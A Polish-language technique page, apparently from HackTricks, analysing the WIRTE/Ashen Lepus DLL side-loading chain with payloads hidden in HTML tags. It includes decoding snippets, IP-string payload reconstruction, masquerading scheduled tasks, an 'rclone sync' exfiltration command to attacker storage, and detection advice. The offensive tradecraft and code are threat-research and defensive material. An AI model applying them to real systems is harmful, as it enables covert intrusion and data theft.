# Zaawansowane DLL Side-Loading z etapowym dostarczaniem payloadu osadzonego w HTML

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd techniki

Ashen Lepus (znany też jako WIRTE) wykorzystał powtarzalny schemat łączący DLL sideloading, etapowe payloady HTML i modułowe backdoory .NET, aby utrzymać się w sieciach dyplomatycznych na Bliskim Wschodzie. Każdy operator może ponownie wykorzystać tę technikę, ponieważ opiera się ona na:<sup>[[1]](#references)</sup>

- **Inżynieria społeczna z wykorzystaniem archiwów**: nieszkodliwe pliki PDF instruują cele, aby pobrały archiwum RAR z serwisu do udostępniania plików. Archiwum zawiera wiarygodnie wyglądający plik EXE przeglądarki dokumentów, złośliwy DLL nazwany tak jak zaufana biblioteka (np. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) oraz przynętę `Document.pdf`.
- **Wykorzystanie kolejności wyszukiwania DLL**: ofiara klika dwukrotnie plik EXE, system Windows znajduje importowany DLL w bieżącym katalogu, a złośliwy loader (AshenLoader) uruchamia się w zaufanym procesie, jednocześnie otwierając przynętę PDF, aby nie wzbudzać podejrzeń.
- **Staging z wykorzystaniem wbudowanych narzędzi systemowych**: każdy kolejny etap (AshenStager → AshenOrchestrator → moduły) pozostaje poza dyskiem do chwili, gdy jest potrzebny, a następnie jest dostarczany jako zaszyfrowany blob ukryty w skądinąd nieszkodliwych odpowiedziach HTML.

## Wieloetapowy łańcuch Side-Loading

1. **Przynęta EXE → AshenLoader**: plik EXE ładuje AshenLoader przez side-loading; AshenLoader zbiera informacje o hoście, szyfruje je AES-CTR, a następnie wysyła metodą POST w rotujących parametrach, takich jak `token=`, `id=`, `q=` lub `auth=`, do ścieżek przypominających API (np. `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Ekstrakcja HTML**: C2 ujawnia kolejny etap tylko wtedy, gdy lokalizacja geograficzna adresu IP klienta wskazuje na region docelowy, a `User-Agent` pasuje do implantu, co utrudnia działanie sandboxów. Po spełnieniu tych warunków treść odpowiedzi HTTP zawiera blob `<headerp>...</headerp>` z payloadem AshenStager zaszyfrowanym metodą Base64/AES-CTR.
3. **Drugi sideload**: AshenStager jest wdrażany z kolejnym legalnym plikiem binarnym, który importuje `wtsapi32.dll`. Złośliwa kopia wstrzyknięta do pliku binarnego pobiera więcej HTML, tym razem wyodrębniając `<article>...</article>` w celu odzyskania AshenOrchestrator.
4. **AshenOrchestrator**: modułowy kontroler .NET, który dekoduje konfigurację JSON zakodowaną w Base64. Pola `tg` i `au` konfiguracji są łączone i haszowane, tworząc klucz AES, który odszyfrowuje `xrk`. Uzyskane bajty służą jako klucz XOR dla każdego później pobranego bloba modułu.
5. **Dostarczanie modułów**: każdy moduł jest opisany w komentarzach HTML, które przekierowują parser do dowolnego tagu, obchodząc statyczne reguły sprawdzające tylko `<headerp>` lub `<article>`. Moduły obejmują mechanizmy utrzymania obecności (`PR*`), deinstalatory (`UN*`), rozpoznanie (`SN`), przechwytywanie ekranu (`SCT`) i przeglądanie plików (`FE`).

### Schemat parsowania kontenera HTML

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Nawet jeśli obrońcy zablokują lub usuną konkretny element, operator musi jedynie zmienić tag wskazany w komentarzu HTML, aby wznowić dostarczanie.<sup>[[1]](#references)</sup>

### Szybki pomocnik ekstrakcji (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## Paralele z omijaniem detekcji przez HTML staging

Najnowsze badania nad HTML smuggling (Talos) wskazują na payloady ukryte jako ciągi Base64 w blokach `<script>` w załącznikach HTML i dekodowane przez JavaScript w czasie działania.<sup>[[2]](#references)</sup> Ten sam trik można wykorzystać ponownie w odpowiedziach C2: umieścić zaszyfrowane bloby w tagu script (lub innym elemencie DOM) i dekodować je w pamięci przed AES/XOR, dzięki czemu strona wygląda jak zwykły HTML. Talos pokazuje też wielowarstwową obfuskację (zmiana nazw identyfikatorów oraz Base64/Caesar/AES) w tagach script, co dobrze pasuje do blobów C2 umieszczanych w HTML.<sup>[[2]](#references)</sup> Późniejszy artykuł Talos o **hidden text salting** również ma tu zastosowanie: podzielenie Base64 za pomocą nieistotnych komentarzy HTML lub białych znaków wystarczy, by zmylić proste ekstraktory regex, a jednocześnie zachować banalną rekonstrukcję po stronie przeglądarki.<sup>[[7]](#references)</sup>

## Uwagi o nowszych wariantach (2024-2025)

- Check Point zaobserwował w 2024 roku kampanie WIRTE, które nadal opierały się na sideloadingu z użyciem archiwów, ale jako pierwszego etapu używały `propsys.dll` (stagerx64). Stager dekoduje kolejny payload za pomocą Base64 + XOR (klucz `53`), wysyła żądania HTTP z zakodowanym na stałe `User-Agent` i wyodrębnia zaszyfrowane bloby osadzone między tagami HTML. W jednej z gałęzi stage został odtworzony z długiej listy osadzonych ciągów IP zdekodowanych przez `RtlIpv4StringToAddressA`, a następnie połączonych w bajty payloadu.<sup>[[3]](#references)</sup>
- OWN-CERT opisał wcześniejsze narzędzia WIRTE, w których dropper wykorzystujący sideloading `wtsapi32.dll` zabezpieczał ciągi za pomocą Base64 + TEA, używając samej nazwy DLL jako klucza deszyfrującego, a następnie obfuskował dane identyfikujące hosta przez XOR/Base64 przed wysłaniem ich do C2.<sup>[[4]](#references)</sup>

## Odtwarzanie etapów zakodowanych jako IP

Gałąź WIRTE z `propsys.dll` z 2024 roku pokazuje, że kolejny PE nie musi znajdować się w jednym ciągłym bloku HTML. Loader może przechowywać bajty stage jako ciągi w formacie dotted-quad i odtwarzać je za pomocą `RtlIpv4StringToAddressA` — jest to wzorzec blisko spokrewniony z techniką **IPfuscation** stosowaną przez Hive.<sup>[[3]](#references)[[5]](#references)</sup> Operacyjnie jest to przydatne, gdy aktor chce, by strona HTML zawierała coś, co wygląda na nieszkodliwe IOC lub dane konfiguracyjne, zamiast oczywistego payloadu Base64.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

Jeśli odzyskane bajty zaczynają się od `MZ`, prawdopodobnie odtworzono bezpośrednio następny PE. Jeśli nie, sprawdź, czy występuje początkowa warstwa XOR/Base64 lub niewielkie fragmenty rozdzielające adresy.

## Wymienne nazwy DLL i rotacja hostów

Istotną zaletą tego wzorca jest to, że **backend HTML/AES/XOR stagingu może pozostać taki sam, a zmianie ulega tylko para sideloadingu**. WIRTE używał w różnych kampaniach bibliotek `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` i `propsys.dll`, co jest przydatne, ponieważ:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` i `wtsapi32.dll` to mało wyróżniające się nazwy bibliotek Windows, których obecności obrońcy spodziewają się w `%System32%` / `%SysWOW64%`.
- Publiczne katalogi, takie jak **HijackLibs**, już mapują wiele plików binarnych, które załadują te nazwy DLL z skopiowanego katalogu aplikacji, dając operatorom alternatywne hosty bez konieczności przeprojektowywania stagera.
- Dostosowania wymaga tylko zestaw eksportów dla danego hosta. Parser HTML, procedury AES/XOR i loader modułów można zwykle przenieść bez zmian do proxy DLL przekazującej wywołania.

W przypadku pracy w ofensywnym laboratorium oznacza to, że problem można podzielić na **(1) znalezienie stabilnego, podpisanego hosta, który lokalnie rozwiązuje wybraną nazwę DLL, oraz (2) ponowne wykorzystanie tej samej logiki loadera staged-HTML za tą biblioteką DLL**.

## Wzmocnienie kryptografii i C2

- **AES-CTR wszędzie**: obecne loadery osadzają 256-bitowe klucze i nonce (np. `{9a 20 51 98 ...}`), a opcjonalnie dodają warstwę XOR z użyciem ciągów takich jak `msasn1.dll` przed deszyfrowaniem lub po nim.<sup>[[1]](#references)</sup>
- **Warianty materiału kluczowego**: wcześniejsze loadery używały Base64 + TEA do ochrony osadzonych ciągów, a klucz deszyfrujący był wyprowadzany z nazwy złośliwej biblioteki DLL (np. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Podział infrastruktury + maskowanie subdomen**: serwery stagingowe są rozdzielone dla poszczególnych narzędzi, hostowane w różnych ASN-ach i czasami umieszczane za subdomenami wyglądającymi na legalne, dzięki czemu ujawnienie jednego etapu nie odsłania pozostałych.
- **Przemycanie danych rozpoznawczych**: zbierane dane obejmują teraz wykazy Program Files, aby wyszukiwać wartościowe aplikacje, i są zawsze szyfrowane przed opuszczeniem hosta.
- **Rotacja URI**: parametry zapytań i ścieżki REST zmieniają się między kampaniami (`/api/v1/account?token=` → `/api/v2/account?auth=`), przez co kruche detekcje przestają działać.
- **Przypinanie User-Agent + bezpieczne przekierowania**: infrastruktura C2 odpowiada tylko na dokładnie określone ciągi UA, a w pozostałych przypadkach przekierowuje do nieszkodliwych serwisów informacyjnych lub zdrowotnych, by wtapiać się w normalny ruch.
- **Kontrolowane dostarczanie**: serwery stosują geofencing i odpowiadają tylko prawdziwym implantom. Niezatwierdzeni klienci otrzymują niebudujący podejrzeń kod HTML.

## Mechanizm trwałości i pętla wykonania

AshenStager tworzy zaplanowane zadania podszywające się pod zadania konserwacyjne Windows i uruchamiane przez `svchost.exe`, np.:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Te zadania ponownie uruchamiają łańcuch sideloadingu przy starcie systemu lub w określonych odstępach czasu, dzięki czemu AshenOrchestrator może pobierać nowe moduły bez ponownego zapisywania czegokolwiek na dysku.

## Używanie legalnych klientów synchronizacji do eksfiltracji

Operatorzy umieszczają dokumenty dyplomatyczne w `C:\Users\Public` (czytelnym dla wszystkich i niebudzącym podejrzeń) za pomocą dedykowanego modułu, a następnie pobierają legalny plik binarny [Rclone](https://rclone.org/), aby synchronizować ten katalog z magazynem atakującego. Unit42 odnotowuje, że to pierwszy zaobserwowany przypadek użycia Rclone przez tego aktora do eksfiltracji, co wpisuje się w szerszy trend nadużywania legalnych narzędzi synchronizacyjnych w celu upodobnienia ruchu do normalnego:<sup>[[1]](#references)</sup>

1. **Przygotowanie**: skopiuj/zbierz pliki docelowe do `C:\Users\Public\{campaign}\`.
2. **Konfiguracja**: dostarcz konfigurację Rclone wskazującą kontrolowany przez atakującego punkt końcowy HTTPS (np. `api.technology-system[.]com`).
3. **Synchronizacja**: uruchom `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`, aby ruch przypominał zwykłe kopie zapasowe w chmurze.

Ponieważ Rclone jest powszechnie używany do legalnych kopii zapasowych, obrońcy powinni koncentrować się na nietypowych uruchomieniach (nowe pliki binarne, podejrzane zdalne lokalizacje lub nagła synchronizacja zawartości `C:\Users\Public`).

## Wskazówki dotyczące detekcji

- Generuj alerty dotyczące **podpisanych procesów**, które nieoczekiwanie ładują DLL z lokalizacji zapisywalnych przez użytkownika (filtry Procmon + `Get-ProcessMitigation -Module`), zwłaszcza gdy nazwy DLL pokrywają się z `netutils`, `srvcli`, `dwampi`, `wtsapi32` lub `propsys`.<sup>[[6]](#references)</sup>
- Sprawdzaj podejrzane odpowiedzi HTTPS pod kątem **dużych ciągów Base64 osadzonych w nietypowych tagach** lub ukrytych za komentarzami `<!-- TAG: <xyz> -->`.
- Najpierw normalizuj HTML: **usuń komentarze i zredukuj białe znaki przed ekstrakcją Base64**, ponieważ unikanie detekcji przez dosalanie ukrytym tekstem może dzielić payloady między granicami komentarzy.
- Rozszerz analizę HTML o **ciągi Base64 wewnątrz bloków `<script>`** (staging w stylu HTML smuggling), które są dekodowane przez JavaScript przed przetwarzaniem AES/XOR.
- Wyszukuj powtarzające się wywołania **`RtlIpv4StringToAddressA`, po których następuje składanie bufora**, zwłaszcza gdy otaczające je ciągi to długie listy adresów IPv4, a nie rzeczywiste cele sieciowe.
- Wyszukuj **zaplanowane zadania**, które uruchamiają `svchost.exe` z argumentami niezwiązanymi z usługami lub wskazują katalogi droppera.
- Śledź **przekierowania C2**, które zwracają payloady tylko dla dokładnie określonych ciągów `User-Agent`, a w pozostałych przypadkach przekierowują do legalnych domen informacyjnych lub zdrowotnych.
- Monitoruj pliki binarne **Rclone** pojawiające się poza lokalizacjami zarządzanymi przez dział IT, nowe pliki `rclone.conf` lub zadania synchronizacji pobierające dane z katalogów stagingowych, takich jak `C:\Users\Public`.

## References

- [1] [Ashen Lepus powiązany z Hamasem atakuje podmioty dyplomatyczne na Bliskim Wschodzie nowym zestawem malware AshTag](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Ukryte między tagami: analiza technik unikania detekcji w HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Powiązany z Hamasem aktor zagrożeń WIRTE kontynuuje działania na Bliskim Wschodzie i przechodzi do aktywności destrukcyjnej](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: W poszukiwaniu straconego czasu](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Ransomware Hive wykorzystuje nowatorską technikę IPfuscation, aby unikać detekcji](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potencjalny sideloading systemowych DLL z lokalizacji spoza katalogów systemowych](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Dosalanie wiadomości e-mail ukrytym tekstem w celu maskowania zagrożeń](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
